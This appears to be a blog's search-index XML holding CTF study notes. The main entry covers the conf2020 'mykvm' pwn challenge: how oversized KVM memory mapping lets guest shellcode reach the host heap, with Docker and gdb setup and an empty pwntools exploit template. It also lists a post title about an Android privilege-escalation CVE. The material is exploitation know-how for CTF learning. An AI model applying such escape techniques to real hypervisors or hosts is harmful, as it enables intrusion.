<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>UAFnote</title>
      <link href="/2023/07/08/UAFnote/"/>
      <url>/2023/07/08/UAFnote/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>conf2020-mykvm</title>
      <link href="/2023/07/08/conf2020-mykvm/"/>
      <url>/2023/07/08/conf2020-mykvm/</url>
      
        <content type="html"><![CDATA[<p>参考：</p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/28/mykvm/">https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/28/mykvm/</a></p><p><a href="https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm">https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm</a></p><p>目标进程会读取用户输入送到实模式的kvm里，漏洞点为kvm映射的宿主进程内存空间过大，可以在kvm中访问到宿主进程的堆空间，因此可以通过shellcode读写宿主进程堆利用。需注意实模式下的shellcode只有1M的寻址空间（20根地址线），因此需要使用shellcode进入到保护模式才行。由于ASRL，存在恰巧堆空间与1M寻址空间相交集的可能，因此也可以爆破当恰巧遇到堆在1M可寻址范围内时，在实模式下直接对堆进行读写完成利用。</p><h2 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h2><ul><li><p>kvm的实现在linux内核中，用户态使用内核提供&#x2F;dev&#x2F;kvm设备节点使用kvm功能</p></li><li><p>kvm只能模拟CPU和内存，不支持模拟IO</p></li><li><p>所以如果要运行一个完整的虚拟机，带界面，IO的，所以不能单独使用kvm，必须和qemu一起</p></li><li><p>qemu可以单独运行虚拟机，也可以和kvm合作一起运行一个虚拟机</p></li><li><p>在qemu开启了-enable-kvm时，可以将guest部分代码通过&#x2F;dev&#x2F;kvm让内核中的kvm运行</p></li><li><p>那个如同vmware的图形界面的软件是virt-manager，底层还是调用kvm+qemu</p></li><li><p>&#x2F;dev&#x2F;kvm只是kvm内核模块提供给用户空间的一个接口，这个接口被qemu-kvm调用，通过ioctl系统调用就可以给用户提供一个工具用以创建，删除，管理虚拟机等。&#x2F;dev&#x2F;kvm设备是kvm(kernel-based virtual machine)虚拟机出来的一个设备文件，kvm提供了三个模块，分别是kvm.ko,kvm_intel.ko,kvm_amd.ko,后两个模块是根据物理主机的CPU所属厂家自动匹配的。</p><p>  Qemu的使用方式:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.打开/dev/kvm设备</span><br><span class="line"></span><br><span class="line">2.通过KVM_CREATE_VM创建一个虚拟机对象</span><br><span class="line"></span><br><span class="line">3.通过KVM_CREATE_VCPU为虚拟机创建vcpu对象</span><br><span class="line"></span><br><span class="line">4.通过KVM_RUN设置vcpu运行起来</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><img src="/2023/07/08/conf2020-mykvm/Untitled.png" class title="Untitled"><p><a href="http://blog.chinaunix.net/uid-14528823-id-4362394.html">恢复下</a>结构体</p><img src="/2023/07/08/conf2020-mykvm/Untitled1.png" class title="Untitled"><p>docker build .一下会</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">13</span>/<span class="number">13</span>] RUN chown -R root:ctf /home/ctf &amp;&amp;     chmod -R <span class="number">777</span> /home/ctf &amp;&amp;     chmod <span class="number">777</span> /home/ctf/flag:</span><br><span class="line">#<span class="number">17</span> <span class="number">9.052</span> chmod: cannot access <span class="string">&#x27;/home/ctf/flag&#x27;</span>: No such file or directory</span><br><span class="line">------</span><br><span class="line">executor failed running [/bin/sh -c chown -R root:ctf /home/ctf &amp;&amp;     chmod -R <span class="number">777</span> /home/ctf &amp;&amp;     chmod <span class="number">777</span> /home/ctf/flag]: <span class="built_in">exit</span> code: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>去掉chmod 777 &#x2F;home&#x2F;ctf&#x2F;flag</p><p>docker run –privileged -p 1234:1234 -p 8000:8888 -d mykvm:16.04</p><blockquote><p>话说为什么remote(“172.17.0.2”,8888)来着</p></blockquote><p>docker exec -it 46ad5dbac87f2077526c376a834e9cde8e70f43a582f26ba86eadc12be6fb843 &#x2F;bin&#x2F;bash</p><p>root@46ad5dbac87f:&#x2F;home&#x2F;ctf# ip show addr &amp;&amp; gdbserver :7779 .&#x2F;mykvm</p><p>这里不知道wsl的gdb连接一直超时，开个新docker连</p><p>可以通过 code_bss 访问到 dest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000602100</span> ??                            code_bss db    ? ;                      ; DATA XREF: pwn+<span class="number">8</span>C↑o</span><br><span class="line">    ......</span><br><span class="line">.bss:<span class="number">000000000060</span>A100 ?? ?? ?? ?? ?? ?? ?? ??       dest dq ?                               ; DATA XREF: main+<span class="number">7</span>E↑w</span><br><span class="line">bss段大小为<span class="number">0x8000</span></span><br></pre></td></tr></table></figure><ul><li>memcpy为什么可以把栈上的指针 copy 到 bss 段？为什么映射内存范围过大，可以导致 guest 代码能访问到宿主机的 bss 段中的其他变量？跟bss段 有什么关系？</li></ul><p>gdb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- encoding: utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"># @File    : do_pwn_template.py</span><br><span class="line"># @Time    : <span class="number">2021</span>/<span class="number">04</span>/<span class="number">02</span> <span class="number">21</span>:<span class="number">15</span>:<span class="number">43</span></span><br><span class="line"># @Author  : Roderick Chan</span><br><span class="line"># @Email   : ch22166@<span class="number">163.</span>com</span><br><span class="line"># @Desc    : pwn题本地调试、远程攻击脚本</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">==========================================================================================</span><br><span class="line">本脚本为pwn题所编写，利用click模块配置命令行参数，</span><br><span class="line">能方便地进行本地调试和远程解题。</span><br><span class="line">本地命令示例：</span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename --tmux <span class="number">1</span> --gdb-breakpoint <span class="number">0x804802a</span> --gdb-breakpoint <span class="built_in">printf</span></span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename -t <span class="number">1</span> -gb <span class="number">0x804802a</span> -gb <span class="built_in">printf</span></span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename -t <span class="number">1</span> -gs <span class="string">&quot;x /12gx \$rebase(0x202080)&quot;</span> -sf <span class="number">0</span> -pl <span class="string">&quot;warn&quot;</span></span><br><span class="line">    即可开始本地调试,并且会断在地址或函数处。先启动tmux后，--tmux才会有效。</span><br><span class="line"></span><br><span class="line">远程命令示例：</span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename -i <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">22164</span></span><br><span class="line">    python3 <span class="built_in">exp</span>.py filename -p <span class="number">22164</span></span><br><span class="line">    可以连接指定的IP和端口。目前在刷buuctf上的题，所以填了默认ip，只指定端口即可。</span><br><span class="line"></span><br><span class="line">==========================================================================================</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">import click</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">import functools</span><br><span class="line"></span><br><span class="line">print(__doc__)</span><br><span class="line"></span><br><span class="line">FILENAME = <span class="string">&#x27;#&#x27;</span> # 要执行的文件名</span><br><span class="line">DEBUG = <span class="number">1</span> # 是否为调试模式</span><br><span class="line">TMUX = <span class="number">0</span> # 是否开启TMUX</span><br><span class="line">GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置</span><br><span class="line">GDB_SCRIPT = None # 当tmux开启的时候, gdb_script的设置，可以是任意有效的语句</span><br><span class="line">IP = None # 远程连接的IP</span><br><span class="line">PORT = None # 远程连接的端口</span><br><span class="line">LOCAL_LOG = <span class="number">1</span> # 本地LOG是否开启</span><br><span class="line">PWN_LOG_LEVEL = <span class="string">&#x27;debug&#x27;</span> <span class="meta"># pwntools的log级别设置</span></span><br><span class="line">STOP_FUNCTION = <span class="number">1</span> # STOP方法是否开启</span><br><span class="line"></span><br><span class="line">CONTEXT_SETTINGS = dict(help_option_names=[<span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;--help&#x27;</span>])</span><br><span class="line"></span><br><span class="line">@click.command(context_settings=CONTEXT_SETTINGS, short_help=<span class="string">&#x27;Do pwn!&#x27;</span>)</span><br><span class="line">@click.argument(<span class="string">&#x27;filename&#x27;</span>, nargs=<span class="number">1</span>, type=str, required=<span class="number">0</span>, <span class="keyword">default</span>=None)</span><br><span class="line">@click.option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, <span class="keyword">default</span>=True, type=<span class="type">bool</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;Excute program at local env or remote env. Default value: True.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--tmux&#x27;</span>, <span class="keyword">default</span>=False, type=<span class="type">bool</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;Excute program at tmux or not. Default value: False.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-gb&#x27;</span>, <span class="string">&#x27;--gdb-breakpoint&#x27;</span>, <span class="keyword">default</span>=[], type=str, multiple=True, help=<span class="string">&quot;Set a gdb breakpoint while tmux is enabled, is a hex address or &#x27;\$rebase&#x27; addr or a function name. Multiple setting supported. Default value:&#x27;[]&#x27;&quot;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-gs&#x27;</span>, <span class="string">&#x27;--gdb-script&#x27;</span>, <span class="keyword">default</span>=None, type=str, help=<span class="string">&quot;Set a gdb script while tmux is enabled, the script will be passed to gdb and use &#x27;\\n&#x27; or &#x27;;&#x27; to split lines. Default value:None&quot;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--ip&#x27;</span>, <span class="keyword">default</span>=None, type=str, nargs=<span class="number">1</span>, help=<span class="string">&#x27;The remote ip addr. Default value: None.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="keyword">default</span>=None, type=<span class="type">int</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;The remote port. Default value: None.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-ll&#x27;</span>, <span class="string">&#x27;--local-log&#x27;</span>, <span class="keyword">default</span>=True, type=<span class="type">bool</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;Set local log enabled or not. Default value: True.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-pl&#x27;</span>, <span class="string">&#x27;--pwn-log&#x27;</span>, type=click.Choice([<span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;warn&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;notset&#x27;</span>]), nargs=<span class="number">1</span>, <span class="keyword">default</span>=<span class="string">&#x27;debug&#x27;</span>, help=<span class="string">&#x27;Set pwntools log level. Default value: debug.&#x27;</span>)</span><br><span class="line">@click.option(<span class="string">&#x27;-sf&#x27;</span>, <span class="string">&#x27;--stop-function&#x27;</span>, <span class="keyword">default</span>=True, type=<span class="type">bool</span>, nargs=<span class="number">1</span>, help=<span class="string">&#x27;Set stop function enabled or not. Default value: True.&#x27;</span>)</span><br><span class="line">def parse_command_args(filename, debug, tmux, gdb_breakpoint, gdb_script,</span><br><span class="line">                       ip, port, local_log, pwn_log, stop_function):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span>FILENAME: The filename of current directory to pwn<span class="number">&#x27;&#x27;&#x27;</span></span><br><span class="line">    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, GDB_SCRIPT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION</span><br><span class="line">    <span class="meta"># assign</span></span><br><span class="line">    FILENAME = filename</span><br><span class="line">    DEBUG = debug</span><br><span class="line">    TMUX = tmux</span><br><span class="line">    GDB_BREAKPOINT = gdb_breakpoint</span><br><span class="line">    GDB_SCRIPT = gdb_script</span><br><span class="line">    IP = ip</span><br><span class="line">    PORT = port</span><br><span class="line">    LOCAL_LOG = local_log</span><br><span class="line">    PWN_LOG_LEVEL = pwn_log</span><br><span class="line">    STOP_FUNCTION = stop_function</span><br><span class="line"></span><br><span class="line">    <span class="meta"># change</span></span><br><span class="line">    <span class="keyword">if</span> PORT: # 远程下这些是需要关闭的</span><br><span class="line">        DEBUG = <span class="number">0</span></span><br><span class="line">        TMUX = <span class="number">0</span></span><br><span class="line">        STOP_FUNCTION = <span class="number">0</span></span><br><span class="line">        GDB_BREAKPOINT = None</span><br><span class="line">        GDB_SCRIPT = None</span><br><span class="line">        <span class="keyword">if</span> IP is None:</span><br><span class="line">            IP = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        IP = None</span><br><span class="line">        PORT = None</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># assert</span></span><br><span class="line">    assert not (FILENAME is None and PORT is None), <span class="string">&#x27;para error&#x27;</span></span><br><span class="line">    assert not (FILENAME is None and DEBUG == <span class="number">1</span>), <span class="string">&#x27;para error&#x27;</span></span><br><span class="line">    assert not (PORT is not None and DEBUG == <span class="number">1</span>), <span class="string">&#x27;para error&#x27;</span></span><br><span class="line">    assert not (DEBUG == <span class="number">0</span> and TMUX == <span class="number">1</span>), <span class="string">&#x27;para error&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta"># print</span></span><br><span class="line">    click.echo(<span class="string">&#x27;=&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">    click.echo(<span class="string">&#x27; [+] Args info:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> FILENAME:</span><br><span class="line">        click.echo(<span class="string">&#x27;  filename: %s&#x27;</span> % FILENAME)</span><br><span class="line">    click.echo(<span class="string">&#x27;  debug enabled: %d&#x27;</span> % DEBUG)</span><br><span class="line">    click.echo(<span class="string">&#x27;  tmux enabled: %d&#x27;</span> % TMUX)</span><br><span class="line">    <span class="keyword">if</span> GDB_BREAKPOINT:</span><br><span class="line">        click.echo(<span class="string">&#x27;  gdb breakpoint: &#123;&#125;&#x27;</span>.format(GDB_BREAKPOINT))</span><br><span class="line">    <span class="keyword">if</span> GDB_SCRIPT:</span><br><span class="line">click.echo(<span class="string">&quot;  gdb script: &#123;&#125;&quot;</span>.format(GDB_SCRIPT))</span><br><span class="line">    <span class="keyword">if</span> IP:</span><br><span class="line">        click.echo(<span class="string">&#x27;  remote ip: %s&#x27;</span> % IP)</span><br><span class="line">    <span class="keyword">if</span> PORT:</span><br><span class="line">        click.echo(<span class="string">&#x27;  remote port: %d&#x27;</span> % PORT)</span><br><span class="line">    click.echo(<span class="string">&#x27;  local log enabled: %d&#x27;</span> % LOCAL_LOG)</span><br><span class="line">    click.echo(<span class="string">&#x27;  pwn log_level: %s&#x27;</span> % PWN_LOG_LEVEL)</span><br><span class="line">    click.echo(<span class="string">&#x27;  stop function enabled: %d&#x27;</span> % STOP_FUNCTION)</span><br><span class="line">    click.echo(<span class="string">&#x27;=&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">parse_command_args.main(standalone_mode=False)</span><br><span class="line"></span><br><span class="line"># 退出条件，只要参数有 -h 或 --help就退出</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> arg in sys.argv:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;-h&#x27;</span> == arg or <span class="string">&#x27;--help&#x27;</span> == arg:</span><br><span class="line">            sys.<span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;&#123;&#125;&#x27;</span>.format(FILENAME))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(IP, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> TMUX:</span><br><span class="line">    context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">    tmp_all_gdb = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> GDB_BREAKPOINT is not None or len(GDB_BREAKPOINT) &gt; <span class="number">0</span>:</span><br><span class="line">        # 解析每一条gdb-breakpoint</span><br><span class="line">        <span class="keyword">for</span> gb in GDB_BREAKPOINT:</span><br><span class="line">            <span class="keyword">if</span> gb.startswith(<span class="string">&#x27;0x&#x27;</span>) or gb.startswith(<span class="string">&#x27;$rebase(&#x27;</span>):</span><br><span class="line">                tmp_all_gdb += <span class="string">&quot;b *&#123;&#125;\n&quot;</span>.format(gb) # 带上*</span><br><span class="line">            <span class="keyword">else</span>: # 传入函数</span><br><span class="line">                tmp_all_gdb += <span class="string">&quot;b &#123;&#125;\n&quot;</span>.format(gb) # 不带*</span><br><span class="line">    <span class="keyword">if</span> GDB_SCRIPT is not None:</span><br><span class="line">        tmp_all_gdb += GDB_SCRIPT.replace(<span class="string">&quot;\\n&quot;</span>, <span class="string">&quot;\n&quot;</span>).replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;\n&quot;</span>) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    tmp_all_gdb += <span class="string">&quot;c\n&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=tmp_all_gdb)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> FILENAME:</span><br><span class="line">    cur_elf = ELF(<span class="string">&#x27;&#123;&#125;&#x27;</span>.format(FILENAME))</span><br><span class="line">    print(<span class="string">&#x27;[+] libc used ===&gt; &#123;&#125;&#x27;</span>.format(cur_elf.libc))</span><br><span class="line"></span><br><span class="line">def LOG_ADDR(addr_name:str, addr:<span class="type">int</span>):</span><br><span class="line">    <span class="keyword">if</span> LOCAL_LOG:</span><br><span class="line">        <span class="built_in">log</span>.success(<span class="string">&quot;&#123;&#125; ===&gt; &#123;&#125;&quot;</span>.format(addr_name, hex(addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def LOG_ADDR_EX(addr_name:str):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    存储地址的变量名，字符串</span><br><span class="line">    如：a = <span class="number">0xdeadbeef</span> </span><br><span class="line">    调用: LOG_ADDR_EX(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL_LOG:</span><br><span class="line">        # 利用eval函数, 首先检索一下</span><br><span class="line">        <span class="keyword">if</span> addr_name in globals() or addr_name in vars():</span><br><span class="line">            tmp_var = eval(addr_name)</span><br><span class="line">            <span class="built_in">log</span>.success(<span class="string">&quot;&#123;&#125; ===&gt; &#123;&#125;&quot;</span>.format(addr_name, hex(tmp_var)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">log</span>.warn(<span class="string">&quot;No variable named: &#x27;&quot;</span> + addr_name + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def STOP():</span><br><span class="line">    <span class="keyword">if</span> not STOP_FUNCTION:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    print(<span class="string">&quot;stop...&#123;&#125;  &#123;&#125;&quot;</span>.format(sys._getframe().f_lineno, proc.pidof(io)))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">############### 定义一些偏函数 ###################</span><br><span class="line"></span><br><span class="line">int16 = functools.partial(<span class="type">int</span>, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">#################### END ########################</span><br><span class="line"></span><br><span class="line">############### 定义一些装饰器函数 ##############<span class="meta">#</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">def time_count(func):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    装饰器：统计函数运行时间</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    @functools.wraps(func)</span><br><span class="line">    def wrapper(*args, **kwargs):</span><br><span class="line">        print(<span class="string">&#x27;=&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">        print(<span class="string">&#x27;function #&#123;&#125;# start...&#x27;</span>.format(func.__name__))</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(<span class="string">&#x27;function #&#123;&#125;# end...execute time: &#123;&#125; s / &#123;&#125; min&#x27;</span>.format(func.__name__, end - start, (end - start) / <span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">def sleep_call(second:<span class="type">int</span>=<span class="number">1</span>, mod:<span class="type">int</span>=<span class="number">1</span>):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    装饰器：在调用函数前后线程先睡眠指定秒数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        second: 休眠秒数</span></span><br><span class="line"><span class="string">        mod: 0 不休眠; 1 为调用前休眠; 2 为调用后休眠; 3 为前后均修眠</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> mod &gt; <span class="number">3</span> or mod &lt; <span class="number">0</span>:</span><br><span class="line">        mod = <span class="number">1</span></span><br><span class="line">    def wrapper1(func):</span><br><span class="line">        @functools.wraps(func)</span><br><span class="line">        def wrapper2(*args, **kwargs):</span><br><span class="line">            <span class="keyword">if</span> mod &amp; <span class="number">1</span>:</span><br><span class="line">                time.sleep(second)</span><br><span class="line">            res = func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">if</span> mod &amp; <span class="number">2</span>:</span><br><span class="line">                time.sleep(second)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> wrapper2</span><br><span class="line">    <span class="keyword">return</span> wrapper1</span><br><span class="line">    </span><br><span class="line">#################### END #######################<span class="meta">#</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">context.update(log_level=PWN_LOG_LEVEL)</span></span><br><span class="line"></span><br><span class="line"># 一般需要带上文件，可注释改行语句</span><br><span class="line">assert FILENAME is not None, <span class="string">&#x27;give me a file!&#x27;</span></span><br><span class="line">##################################################</span><br><span class="line">##############以下为攻击代码#######################</span><br><span class="line">##################################################</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-7911:Android &lt;5.0 Privilege Escalation using ObjectInputStream</title>
      <link href="/2023/06/29/CVE-2014-7911-Android-5-0-Privilege-Escalation-using-ObjectInputStream/"/>
      <url>/2023/06/29/CVE-2014-7911-Android-5-0-Privilege-Escalation-using-ObjectInputStream/</url>
      
